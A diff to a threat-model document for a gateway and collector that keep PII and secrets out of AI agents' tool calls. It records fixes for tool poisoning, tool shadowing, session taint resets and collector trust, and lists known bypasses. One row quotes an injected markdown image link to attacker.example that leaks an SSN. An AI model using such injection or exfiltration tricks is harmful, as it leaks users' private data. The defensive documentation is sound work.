@@ -141,8 +141,10 @@ taken over.
 | prevented | in `redact` and `block` mode the server only gets redacted arguments for its tool's destination | `taintward/gateway/server.py` | `tests/test_gateway.py::test_redact_mode_raw_values_never_reach_send_email` |
 | prevented | sensitive values in its **text** results are masked before the agent sees them (`redact_results`, on by default), and the session becomes tainted | `taintward/gateway/server.py` (`_redact_result`) | `tests/test_gateway.py::test_session_taint_flags_later_clean_calls` |
 | detected | its tool calls are recorded on spans with the policy decision | `taintward/gateway/server.py` | `tests/test_gateway.py::test_audit_mode_passes_through_but_records_violation` |
-| not handled | **tool poisoning**: tool names, descriptions and input schemas from `tools/list` are passed to the agent unchanged, so instructions hidden in a description reach the model | `GatewaySession.refresh_tools` | none (gap G2) |
-| not handled | **tool shadowing**: on a name clash the first upstream in config order wins. A rule without `upstream:` matches a tool of that name from any upstream, so a hostile server can add a tool whose name matches a rule meant for an internal tool (and get reversible tokens, or raw values for `passthrough_args`) | `taintward/gateway/config.py` (`ToolRule.matches`) | none (gap G3) |
+| detected | **tool poisoning after review**: the gateway keeps a fingerprint of each tool's description, title and schemas. A tool that differs from its pin in `tool_pins` (made with `--print-tool-pins`) or from the version first seen gets a `taintward.gateway tool_changed` span and a warning, once per new version; with `on_tool_change: hide` it is no longer listed and calls to it are refused (gap G2, closed) | `taintward/gateway/server.py` (`tool_fingerprint`, `_tool_ok`) | `tests/test_gateway_hardening.py::test_changed_description_is_reported_once`, `::test_hide_mode_stops_exposing_a_changed_tool`, `::test_pins_are_checked_from_the_first_listing` |
+| not handled | **tool poisoning in a tool you pinned**: the gateway checks that a description stays the same, not that it is harmless. Read the descriptions before you pin them | | |
+| prevented | **tool shadowing**: two upstreams offering the same name stops the gateway at startup; a clash that appears later hides both tools until it is gone. A rule that grants `internal` or `passthrough_args` without `upstream:` logs a warning when there are several upstreams, and an `upstream:` that names no configured upstream is a config error (gap G3, closed) | `taintward/gateway/server.py` (`refresh_tools`), `taintward/gateway/config.py` | `tests/test_gateway_hardening.py::test_clash_at_startup_refuses_to_start`, `::test_clash_that_appears_later_hides_both`, `::test_loose_internal_rule_warns_with_several_upstreams` |
+| not handled | a rule without `upstream:` still matches a new tool of that name from any upstream when no other upstream offers it; the warning only says so | | |
 | not handled | images, audio and binary resources in results pass through unscanned (documented in `docs/mcp-gateway.md`) | `_result_payload` | |
 | not handled | the server sees the taint baggage (`taint.id`, `taint.classes`, `taint.level`) forwarded with the call, so it learns that the session holds PII or secrets | `taintward/gateway/server.py`, `taintward/sdk/taint.py` (`to_baggage`) | |
 | not handled | `audit` mode forwards raw arguments on purpose | | `tests/test_gateway.py::test_audit_mode_passes_through_but_records_violation` |
@@ -231,8 +233,10 @@ Not in the list above, but a buyer will ask.
 | prevented | the gateway over HTTP requires `Authorization: Bearer` when `TAINTWARD_GATEWAY_TOKEN` is set (constant time compare) and only accepts session ids it issued | `taintward/gateway/http.py` | `tests/test_gateway_http.py::test_http_auth_on`, `::test_http_session_rules` |
 | prevented | the gateway fails closed when the session store is down | `server.py`, `http.py` | `tests/test_gateway_http.py::test_session_store_down_fails_closed` |
 | not handled | without the token the gateway accepts anyone (it logs a warning). There is no TLS in the gateway itself; put it behind TLS | `__main__.py` | `tests/test_gateway_http.py::test_http_auth_off_accepts_requests_without_token` |
-| not handled | the sample collector configs listen on `0.0.0.0:4319` with no auth and export to SigNoz with `tls.insecure: true` | `collector/config.yaml` | gap G8 |
-| not handled | a client can end its MCP session and open a new one, which starts with no taint | `http.py` | gap G4 |
+| prevented | the sidecar config listens on `127.0.0.1:4319`, and the compose file publishes the collector and Jaeger ports on the host loopback only. `collector/config.secure.yaml` and Helm `collector.auth` add producer bearer tokens and TLS for a receiver other hosts can reach (gap G8, closed) | `collector/config.yaml`, `collector/config.secure.yaml`, `docker-compose.yml` | checked with the collector's `validate` command; producer auth checked live (401 without the token) |
+| not handled | `config.docker.yaml`, `config.gateway-tier.yaml` and the Helm defaults still listen on all interfaces of the container or pod without auth, and export with `tls.insecure: true`; that is only safe on a private network | | |
+| prevented | with one token per client (`TAINTWARD_GATEWAY_TOKENS=alice:<token>,...`, or `client:` in the config for stdio) the taint is kept per client as well as per session, so ending a session and starting a new one does not clear it (gap G4, closed). The client name is set by the gateway from the token; a name the client sends itself is dropped | `http.py`, `server.py` (`_merge_taint`) | `tests/test_gateway_hardening.py::test_client_taint_survives_a_new_session`, `::test_http_app_names_the_client_from_its_token` |
+| not handled | with one shared `TAINTWARD_GATEWAY_TOKEN` (or no token) the gateway cannot tell clients apart, so the taint is per session only, as before | | |
 
 ## Known bypasses
 
@@ -260,7 +264,7 @@ them, but in `redact` mode the value itself goes through.
 | numbers and non-string leaves are checked as strings, but `None` and booleans are skipped | `{"is_hiv_positive": true}` | the key name is data the detector does not judge; the boolean passes |
 | side channels | placeholder numbers and types, mask counts, payload shape, span timing, `taintward.policy.masked_values` | leak how many sensitive values there were and of which type |
 | model output that is streamed | `stream=True` on a protected client | the request is redacted, the streamed answer is neither scanned nor restored (`llm_clients.py`, `docs/integrations.md`) |
-| collector input trust | a producer sets `taintward.sensitive=false` or `taintward.args_redacted=true` | `sensitive=false`: no violation is recorded (the regex backstop still runs). `args_redacted=true`: the collector skips the backstop on `gen_ai.tool.call.arguments` and stores it as sent (`collector/processor/taintpolicy/hardening_test.go::TestArgs_SkippedWhenMarkerSet` shows this is by design) |
+| collector input trust | a producer sets `taintward.sensitive=false` or `taintward.args_redacted=true` | without `trusted_services`: `sensitive=false` records no violation (the regex backstop still runs), and `args_redacted=true` makes the collector skip the backstop on `gen_ai.tool.call.arguments` (`hardening_test.go::TestArgs_SkippedWhenMarkerSet`, by design). With `trusted_services` both only work for listed services, and with producer auth only for token holders |
 
 ## Non-goals
 
@@ -305,12 +309,12 @@ Taintward handles it.
 | | threat | status |
 |---|---|---|
 | S | a client without the token calls tools | mitigated when `TAINTWARD_GATEWAY_TOKEN` is set (`test_http_auth_on`); open when it is not |
-| S | a client guesses or reuses another session id | mitigated: ids are random uuid4 hex issued by the gateway and checked against the store (`test_http_session_rules`). The token is shared by all clients, so any token holder is any client |
-| T | a hostile upstream changes tool descriptions (tool poisoning) | open (G2) |
-| T | a hostile upstream shadows a tool name that a rule treats as internal | open (G3) |
+| S | a client guesses or reuses another session id | mitigated: ids are random uuid4 hex issued by the gateway and checked against the store (`test_http_session_rules`). With one shared token any token holder is any client; `TAINTWARD_GATEWAY_TOKENS` gives each client its own |
+| T | a hostile upstream changes tool descriptions (tool poisoning) | mitigated for changes after review: pins and first-seen fingerprints, `on_tool_change: hide` (G2) |
+| T | a hostile upstream shadows a tool name that a rule treats as internal | mitigated: name clashes are an error, loose rules warn (G3) |
 | R | a call is not recorded | mitigated for calls through the gateway: one span per call, including blocked and failed ones |
 | I | raw arguments to a hostile upstream | mitigated in `redact` / `block` for detected values; `audit` and `passthrough_args` forward raw by design |
-| I | session reset by ending the session | open (G4) |
+| I | session reset by ending the session | mitigated with per client tokens: taint is kept per client (G4); open with one shared token |
 | D | large bodies | mitigated: 4 MB body limit (`MAX_BODY_BYTES`) |
 | D | session store down | mitigated: fail closed (`test_session_store_down_fails_closed`) |
 | E | `block` mode bypassed through a tool that matches no rule | partial: unknown tools get the defaults (`external`, `redact`), so they are redacted but not blocked unless the defaults say `block` |
@@ -319,10 +323,10 @@ Taintward handles it.
 
 | | threat | status |
 |---|---|---|
-| S | any process that can reach port 4319 sends spans | open in the sample configs (G8). The collector has no producer authentication |
+| S | any process that can reach port 4319 sends spans | mitigated: the sidecar config listens on loopback, `config.secure.yaml` and Helm `collector.auth` require a bearer token (G8). Open in the other sample configs on a shared network |
 | T | a producer fakes `taintward.policy.*` attributes | mitigated: owned attributes are removed and rewritten (`hardening_test.go::TestFailClosed_RegoErrorStillRedacts`) |
-| T | a producer sets `taintward.sensitive=false` | open: the policy trusts it (G7). The backstop still runs |
-| T | a producer sets `taintward.args_redacted=true` to store raw arguments | open by design: the marker is trusted (G7). Strict bool only (`TestArgs_StringMarkerNotAccepted`) |
+| T | a producer sets `taintward.sensitive=false` | mitigated with `trusted_services`: spans from a service not in the list are treated as sensitive and marked `taintward.policy.untrusted_producer` (G7, `hardening_test.go::TestTrusted_UntrustedProducerCannotClaimClean`). `service.name` is set by the producer, so pair it with producer auth. Open when the list is empty (the default) |
+| T | a producer sets `taintward.args_redacted=true` to store raw arguments | mitigated with `trusted_services`: the marker is ignored for other services (G7, `TestTrusted_ListedServiceKeepsItsMarker`). Strict bool only (`TestArgs_StringMarkerNotAccepted`) |
 | R | spans are dropped or sampled | open: the collector does not count what it never received |
 | I | raw secret or PII pattern reaches storage | mitigated for the regex set (`TestMask_Table`, `TestRedact_NestedMapAndSlice`, `TestRedact_TooDeepIsReplaced`); names and addresses are not in that set (G5) |
 | D | policy error | mitigated: fails closed, still redacts (`TestFailClosed_*`) |
@@ -362,19 +366,19 @@ Taintward handles it.
 ## Gaps
 
 Things a reader could reasonably expect from the rest of the docs, checked
-against the code and found missing or weaker. G1, G5, G6, G10 and G11 are
-fixed (each row says how); the others are open.
+against the code and found missing or weaker. All but G9 are fixed (each
+row says how); G9 is open.
 
 | id | gap | where | suggested fix |
 |---|---|---|---|
 | G1 | **Fixed.** Placeholders were restored into the model's final answer without any check, so an injected `![x](https://attacker.example/?d=<SSN_1>)` became a link or image carrying the real value | `taintward/sdk/placeholders.py` (`in_url`), `packages/taintward-js/src/placeholders.ts` | placeholders inside link and image addresses are not restored and are reported as `blocked`; `TAINTWARD_RESTORE_IN_URLS=1` turns it off |
-| G2 | The gateway passes tool names, descriptions and schemas from upstream servers to the agent unchanged (tool poisoning) | `taintward/gateway/server.py` (`refresh_tools`) | optional description allow list or pinning (hash of the tool list in config), and a span event when a tool's description changes |
-| G3 | Gateway rules without `upstream:` match a tool of that name from any upstream, and the first upstream in config order wins a name clash. A hostile upstream can claim a name a rule treats as `internal` or that has `passthrough_args` | `taintward/gateway/config.py` (`ToolRule.matches`), `refresh_tools` | warn at startup for rules that grant `internal` or `passthrough_args` without `upstream:`; treat a name clash as an error, not a warning |
-| G4 | Session taint can be reset by the client: end the session (`DELETE /mcp`, or a new stdio process) and `initialize` again. The agent's context still holds the data but the new session is clean | `taintward/gateway/http.py` | optional taint keyed by client identity (token or mTLS name) in addition to the session id |
+| G2 | **Fixed.** The gateway passed tool descriptions and schemas from upstream servers to the agent with no check (tool poisoning) | `taintward/gateway/server.py` (`tool_fingerprint`, `_tool_ok`) | `tool_pins` (from `--print-tool-pins`) or the first seen version; a change gets a `tool_changed` span, and `on_tool_change: hide` stops exposing the tool |
+| G3 | **Fixed.** The first upstream in config order won a name clash, and loose rules were silent | `taintward/gateway/server.py` (`refresh_tools`), `taintward/gateway/config.py` | a clash stops the gateway at startup and hides both tools later; rules granting `internal` or `passthrough_args` without `upstream:` warn; an unknown `upstream:` is an error |
+| G4 | **Fixed.** Session taint could be reset by ending the session and starting a new one | `taintward/gateway/http.py`, `server.py` | `TAINTWARD_GATEWAY_TOKENS` (one token per client) or `client:` for stdio: taint is kept per client too |
 | G5 | **Fixed.** With `TAINTWARD_MASK_IN_SDK=0`, tool outputs were sent raw to the collector, whose backstop only knows regex types | `taintward/sdk/instrumentation.py` (`record_result`) | outputs are masked in the process whatever the flag says; the flag now only leaves tool input masking to the sidecar |
 | G6 | **Fixed.** The compliance report showed an unsalted `sha256(value)[:8]` for every raw value found, which can be brute forced for SSNs and phone numbers | `taintward/evidence/report.py` (`_fp`) | HMAC-SHA256 (12 hex characters) with `TAINTWARD_REPORT_KEY`, or a random key per report |
-| G7 | The collector trusts `taintward.sensitive` and `taintward.args_redacted` from any producer that can reach it. A producer that lies about `sensitive` gets no violation; one that sets the marker gets raw arguments stored | `collector/processor/taintpolicy/processor.go` | authenticate producers (OTLP auth extension, mTLS), and allow the marker only from listed service names |
-| G8 | The sample collector configs listen on `0.0.0.0:4319` without auth and export with `tls.insecure: true` | `collector/config.yaml`, `collector/config.docker.yaml`, `collector/config.gateway-tier.yaml` | bind to `127.0.0.1` in the sidecar config, document TLS and auth for the export |
+| G7 | **Fixed.** The collector trusted `taintward.sensitive` and `taintward.args_redacted` from any producer | `collector/processor/taintpolicy/processor.go` (`trusted_services`), `collector/builder.yaml` (bearertokenauth) | `trusted_services`: other services are treated as sensitive and their marker is ignored; producer bearer tokens in `config.secure.yaml` and Helm `collector.auth` |
+| G8 | **Fixed.** The sidecar config listened on `0.0.0.0:4319` without auth | `collector/config.yaml`, `collector/config.secure.yaml`, `docker-compose.yml` | the sidecar listens on `127.0.0.1`, compose publishes on loopback, `config.secure.yaml` adds auth and TLS on both sides |
 | G9 | Detection quality on outside data is much lower than on the synthetic benchmark, especially names outside English, non-US ids and addresses (see "Results on outside data" in `docs/benchmark.md`). The README's "0% false alarms" and "0.94 recall" are synthetic-only numbers | `taintward/sdk/detect.py` | the ranked list of improvements in `docs/benchmark.md` |
 | G10 | **Fixed.** There was no size cap on detection in the SDK or gateway; a few MB of capitalized prose could hold a call for seconds | `taintward/sdk/detect.py` (`max_chars`) | `TAINTWARD_DETECT_MAX_CHARS` (default 500000, 0 = off): a longer value is not scanned and is masked whole (`OVERSIZE_VALUE`, placeholder `<TOO_LARGE_1>`) |
 | G11 | **Fixed.** Token reversal (`Redactor.reverse`, `tw.restore`) was not logged | `taintward/sdk/redact.py` (`record_reversal`) | a `taintward.reverse` span event and a `taintward.audit` log line per call, with key id and caller |
@@ -425,20 +429,25 @@ Agent and SDK
 
 MCP gateway
 
-- [ ] Set `TAINTWARD_GATEWAY_TOKEN` and put the gateway behind TLS.
+- [ ] Set `TAINTWARD_GATEWAY_TOKENS` (one token per client, so taint is kept
+      per client, G4), or at least `TAINTWARD_GATEWAY_TOKEN`, and put the
+      gateway behind TLS.
 - [ ] Use `block` mode for tools that leave your system and cannot accept a
       masked value; never leave `audit` on for them.
 - [ ] Pin every rule that grants `internal` or `passthrough_args` to an
       `upstream:` (G3). Use `prefix:` per upstream to avoid name clashes.
-- [ ] Only proxy MCP servers you have reviewed; read their tool descriptions
-      (G2).
+- [ ] Only proxy MCP servers you have reviewed; read their tool descriptions,
+      then pin them (`--print-tool-pins` into `tool_pins:`) and set
+      `on_tool_change: hide` (G2).
 - [ ] Use a Redis session store with several replicas, and a TTL that
       matches how long an agent keeps context.
 
 Collector and storage
 
-- [ ] Bind the sidecar receiver to `127.0.0.1` (or the pod network only) and
-      add OTLP auth or mTLS for producers (G7, G8).
+- [ ] Bind the sidecar receiver to `127.0.0.1` (or the pod network only).
+      When other hosts send spans, start from `collector/config.secure.yaml`
+      or Helm `collector.auth`, and list your agents in `trusted_services`
+      (G7, G8).
 - [ ] Export to the backend over TLS (`tls.insecure: false`).
 - [ ] Keep the `taint_policy` default `drop_attributes` (Google ADK's
       content attributes) unless you list your own.
